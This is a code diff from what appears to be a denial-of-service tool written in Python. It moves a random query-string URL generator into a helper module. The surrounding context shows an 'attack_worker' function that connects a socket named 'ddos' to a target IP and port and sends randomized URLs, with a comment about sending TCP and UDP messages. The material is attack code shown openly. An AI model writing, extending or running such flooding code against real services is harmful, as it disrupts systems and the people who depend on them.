@@ -1,18 +1,6 @@
-import random
-from helpers import useragents
+from helpers import get_random_url
 import json
 import socket
-
-
-def getRandomUrl():
-    url = "/?"
-    for i in range(random.randint(1, 8)):
-        key = useragents.generateQueryString(random.randint(
-            1, 5))
-        value = useragents.generateQueryString(random.randint(
-            1, 5))
-        url += f"{key}={value}&"
-    return url
 
 
 def attack_worker(ip_address, port):
@@ -22,7 +10,7 @@ def attack_worker(ip_address, port):
         ddos.connect((ip_address, port))
 
         # Creating random url to send message
-        random_url = getRandomUrl()
+        random_url = get_random_url()
         message = json.dumps(random_url).encode()
 
         # Sending TCP and UDP message
